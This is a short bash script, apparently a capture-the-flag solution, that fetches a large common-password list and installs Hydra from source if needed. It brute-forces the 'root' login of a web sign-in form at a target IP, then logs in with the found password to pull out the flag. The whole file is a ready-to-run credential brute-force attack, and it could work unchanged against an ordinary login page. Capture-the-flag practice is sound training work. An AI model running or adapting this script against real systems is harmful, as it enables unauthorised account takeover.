#!/bin/bash

if [ "$#" -ne 1 ]; then
	echo "Usage: ./script.sh <ip>"
	exit 1
else
    ip=$1
fi

function exec_hydra {
	curl -o dictionary https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
	output=$(hydra -l root -P dictionary -F -V "$ip" http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif')
	password=$(echo "$output" | grep -oP 'password: \K\S+')
	rm dictionary
}

if command -v hydra &> /dev/null; then
	echo "Hydra is installed."
	exec_hydra
else
	echo "Hydra is not installed."
	echo "Installation..."
	git clone https://github.com/vanhauser-thc/thc-hydra.git
	cd thc-hydra
	./configure --prefix=$HOME/.local
	make
	make install
	export PATH=$HOME/.local/bin:$PATH
	source ~/.bashrc
	source ~/.zshrc
	exec_hydra
fi

curl "http://$ip/index.php?page=signin&username=root&password=$password&Login=Login#" | grep flag | awk -F': | <' '{print "\nThe flag is: "$2}'
